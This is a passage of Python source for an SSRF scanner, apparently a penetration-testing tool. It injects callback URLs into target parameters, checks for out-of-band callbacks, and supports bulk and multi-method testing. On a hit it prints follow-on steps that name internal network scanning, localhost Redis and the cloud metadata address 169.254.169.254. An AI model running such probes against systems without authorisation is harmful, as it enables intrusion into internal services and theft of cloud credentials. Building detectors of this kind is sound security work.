                    test_url = f"{target_url}?{parameter}={callback_url}"
                    response = self.session.get(test_url, timeout=timeout, headers=headers)
                elif method.upper() == 'POST':
                    # Try POST with JSON body first (modern APIs)
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(
                        target_url,
                        json={parameter: callback_url},  # ✅ JSON body
                        timeout=timeout,
                        headers=headers
                    )
                else:
                    # Other methods (PUT, DELETE, PATCH) with JSON
                    headers['Content-Type'] = 'application/json'
                    response = self.session.request(
                        method.upper(),
                        target_url,
                        json={parameter: callback_url},
                        timeout=timeout,
                        headers=headers
                    )
                
                initial_response = {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'content_length': len(response.content),
                    'response_time': response.elapsed.total_seconds()
                }
            except Exception as e:
                initial_response = {'error': str(e)}
            
            # Wait for callback (increase timeout for slow targets)
            print(f"[*] Waiting for callback (10 seconds)...")
            import time
            time.sleep(10)  # Give target time to fetch URL
            callbacks = self.callback_server.get_callbacks(timeout=2)
            
            # Filter for callbacks matching our test_id
            matching_callbacks = [cb for cb in callbacks if test_id in cb.get('path', '')]
            
            # ✅ COUNT all matching callbacks (target successfully fetched our URL)
            ssrf_callbacks = matching_callbacks
            
            attempt = {
                'address': address,
                'callback_url': callback_url,
                'callbacks_received': len(callbacks),
                'ssrf_callbacks': len(ssrf_callbacks),
                'callback_details': callbacks,
                'ssrf_details': ssrf_callbacks,
                'initial_response': initial_response
            }
            all_attempts.append(attempt)
            total_callbacks += len(ssrf_callbacks)  # Chỉ count SSRF callbacks
            
            if len(ssrf_callbacks) > 0:
                print(f"[+] ✅ SSRF CONFIRMED! Received {len(ssrf_callbacks)} callback(s)")
                for cb in ssrf_callbacks:
                    print(f"    Path: {cb.get('path')}")
                    print(f"    User-Agent: {cb.get('user_agent', 'N/A')}")
                    print(f"    Time: {cb.get('timestamp')}")
                # Found working address, no need to try others
                break
            else:
                print(f"[-] No callback received for {address}")
                print(f"    Total callbacks in server: {len(callbacks)}")
                if len(callbacks) > 0:
                    print(f"    (None matched test_id: {test_id})")
        
        # Analyze results
        # ✅ FIX: Chỉ vulnerable khi có callback VÀ endpoint phản hồi thành công (200-399)
        successful_attempt = next((a for a in all_attempts if a['callbacks_received'] > 0), None)
        
        # Check if endpoint actually responded successfully
        has_valid_response = False
        if successful_attempt and successful_attempt.get('initial_response'):
            response = successful_attempt['initial_response']
            has_valid_response = response.get('status_code', 0) in range(200, 400)
        
        is_vulnerable = total_callbacks > 0 and has_valid_response
        
        result = {
            'target_url': target_url,
            'parameter': parameter,
            'method': method,
            'is_vulnerable': is_vulnerable,
            'callbacks_received': total_callbacks,
            'has_valid_response': has_valid_response,
            'all_attempts': all_attempts,
            'successful_address': successful_attempt['address'] if successful_attempt else None,
            'callback_url': successful_attempt['callback_url'] if successful_attempt else all_attempts[-1]['callback_url'],
            'callback_details': successful_attempt['callback_details'] if successful_attempt else [],
            'timestamp': datetime.now().isoformat()
        }
        
        if is_vulnerable:
            print(f"[+] 🎯 SSRF BEHAVIOR DETECTED!")
            print(f"[+] Server fetched URL controlled by attacker: {total_callbacks} callback(s)")
            print(f"[!] ⚠️  NOTE: This confirms server CAN fetch external URLs.")
            print(f"[!]     To exploit SSRF, attacker can now:")
            print(f"[!]     - Scan internal network (192.168.x.x)")
            print(f"[!]     - Access localhost services (127.0.0.1:6379)")
            print(f"[!]     - Read cloud metadata (169.254.169.254)")
            print(f"[!]     - Access internal-only services")
            if successful_attempt:
                for cb in successful_attempt['callback_details']:
                    print(f"    Path: {cb.get('path', 'N/A')}")
                    print(f"    User-Agent: {cb.get('user_agent', 'N/A')}")
                    print(f"    Timestamp: {cb.get('timestamp', 'N/A')}")
        else:
            print(f"[-] No SSRF detected")
            if total_callbacks > 0 and not has_valid_response:
                print(f"    ⚠️  Received {total_callbacks} callback(s) but endpoint returned error/not found")
                print(f"    This is likely a false positive (endpoint doesn't exist)")
            else:
                print(f"    Possible reasons:")
                print(f"    - URL parameter is validated/whitelisted")
                print(f"    - Outbound connections are blocked by firewall")
                print(f"    - Application doesn't fetch external URLs")
            print(f"    Tried addresses: {', '.join([a['address'] for a in all_attempts])}")
        
        self.test_results.append(result)
        return result
    
    def test_ssrf_multi_method(self, target_url: str, parameter: str, 
                               methods: List[str] = None, timeout: int = 10) -> Dict:
        """
        Test SSRF với nhiều HTTP methods để xác định endpoint hỗ trợ methods nào
        
        Args:
            target_url: URL của endpoint cần test
            parameter: Tên parameter để inject SSRF payload
            methods: Danh sách HTTP methods cần test (default: ['GET', 'POST'])
            timeout: Timeout cho mỗi request
        
        Returns:
            Dict với kết quả test cho từng method:
            {
                'target_url': str,
                'parameter': str,
                'methods_tested': List[str],
                'vulnerable_methods': List[str],
                'method_results': {
                    'GET': {...result...},
                    'POST': {...result...},
                    ...
                },
                'summary': {...}
            }
        """
        if methods is None:
            methods = ['GET', 'POST']  # Default test both GET and POST
        
        print(f"\n{'='*60}")
        print(f"🔬 MULTI-METHOD SSRF TESTING")
        print(f"{'='*60}")
        print(f"🎯 Target: {target_url}")
        print(f"📝 Parameter: {parameter}")
        print(f"🔧 Methods to test: {', '.join(methods)}")
        print(f"{'='*60}\n")
        
        method_results = {}
        vulnerable_methods = []
        
        for method in methods:
            print(f"\n📌 Testing with HTTP {method.upper()}...")
            print(f"{'-'*60}")
            
            # Test with this method
            result = self.test_ssrf(target_url, parameter, method=method, timeout=timeout)
            method_results[method.upper()] = result
            
            # Track vulnerable methods
            if result.get('is_vulnerable', False):
                vulnerable_methods.append(method.upper())
                print(f"✅ {method.upper()} is VULNERABLE to SSRF!")
            else:
                print(f"❌ {method.upper()} is NOT vulnerable (or blocked)")
            
            print(f"{'-'*60}")
            
            # Small delay between tests
            if method != methods[-1]:
                time.sleep(1)
        
        # Create comprehensive result
        comprehensive_result = {
            'target_url': target_url,
            'parameter': parameter,
            'methods_tested': [m.upper() for m in methods],
            'vulnerable_methods': vulnerable_methods,
            'method_results': method_results,
            'summary': {
                'total_methods_tested': len(methods),
                'vulnerable_methods_count': len(vulnerable_methods),
                'is_vulnerable': len(vulnerable_methods) > 0,
                'vulnerability_rate': len(vulnerable_methods) / len(methods) if methods else 0
            },
            'timestamp': datetime.now().isoformat()
        }
        
        # Print summary
        print(f"\n{'='*60}")
        print(f"📊 MULTI-METHOD TEST SUMMARY")
        print(f"{'='*60}")
        print(f"🎯 Endpoint: {target_url}")
        print(f"📝 Parameter: {parameter}")
        print(f"🔬 Methods tested: {', '.join(comprehensive_result['methods_tested'])}")
        print(f"✅ Vulnerable methods: {', '.join(vulnerable_methods) if vulnerable_methods else 'NONE'}")
        print(f"📈 Vulnerability rate: {comprehensive_result['summary']['vulnerability_rate']:.1%}")
        print(f"{'='*60}\n")
        
        return comprehensive_result
    
    def bulk_test(self, targets: List[Dict], wait_time: int = 2) -> List[Dict]:
        """
        Test multiple targets
        
        Args:
            targets: List of {'url': ..., 'parameter': ..., 'method': ...}
            wait_time: Thời gian đợi giữa các tests
        """
        results = []
        
        for i, target in enumerate(targets):
            print(f"\n[{i+1}/{len(targets)}] Testing: {target['url']}")
            
            result = self.test_ssrf(
                target['url'],
                target['parameter'],
                target.get('method', 'GET')
            )
            
            results.append(result)
            
            # Wait trước khi test tiếp
            if i < len(targets) - 1:
                time.sleep(wait_time)
        
        return results
    
    def get_summary(self) -> Dict:
        """Lấy summary của tất cả tests"""
        total_tests = len(self.test_results)
        vulnerable = sum(1 for r in self.test_results if r['is_vulnerable'])
        
        return {
            'total_tests': total_tests,
            'vulnerable': vulnerable,
            'not_vulnerable': total_tests - vulnerable,
            'vulnerability_rate': vulnerable / total_tests if total_tests > 0 else 0
        }

# Utility function để tích hợp với các cloud callback services
class CloudCallbackService:
    """Integration với cloud callback services như Burp Collaborator, webhook.site"""
    
    @staticmethod
    def get_burp_collaborator_url() -> str:
        """
        Tạo Burp Collaborator URL
        Note: Cần Burp Suite Professional
        """
        # This would integrate with Burp Suite API
        # For now, return placeholder
        return "http://YOUR_COLLABORATOR_ID.burpcollaborator.net"
    
    @staticmethod
    def get_webhook_site_url() -> str:
        """
        Tạo webhook.site URL
        """
        # Call webhook.site API to create unique URL
        try:
            response = requests.post('https://webhook.site/token')
            data = response.json()
            return f"https://webhook.site/{data['uuid']}"
        except:
            return None
    
    @staticmethod
    def check_webhook_site_callbacks(webhook_uuid: str) -> List[Dict]:
        """Check callbacks trên webhook.site"""
        try:
            response = requests.get(
                f'https://webhook.site/token/{webhook_uuid}/requests'
            )
            return response.json()
        except:
            return []


class MockCallbackServer:
    """
    Mock callback server for PUBLIC callback URLs (e.g., interact.sh, oast.fun)
    
    Không chạy HTTP server, chỉ return empty callbacks (vì polling được handle externally)
    """
    def __init__(self, callback_url: str):
        self.callback_url = callback_url
    
    def get_callback_url(self) -> str:
        return self.callback_url
    
    def get_callbacks(self) -> List[Dict]:
        """
        Return empty list vì public callback services không support realtime polling
        
        User phải check manually trên web interface của service (e.g., interact.sh)
        """
        return []
    
    def clear_callbacks(self):
        pass
    
    def stop(self):
        pass


if __name__ == "__main__":
    # Test callback server
    server = CallbackServer(host='0.0.0.0', port=8888)
    server.start()
    
    detector = ExternalCallbackDetector(server)
    
    # Test SSRF
    result = detector.test_ssrf(
        target_url="http://localhost:8083/inventory/1/M",
        parameter="callback_url",
        method="GET"
    )
    
    print("\n" + "="*60)
    print("TEST RESULT:")
    print(f"Vulnerable: {result['is_vulnerable']}")
    print(f"Callbacks: {result['callbacks_received']}")
    
    server.stop()
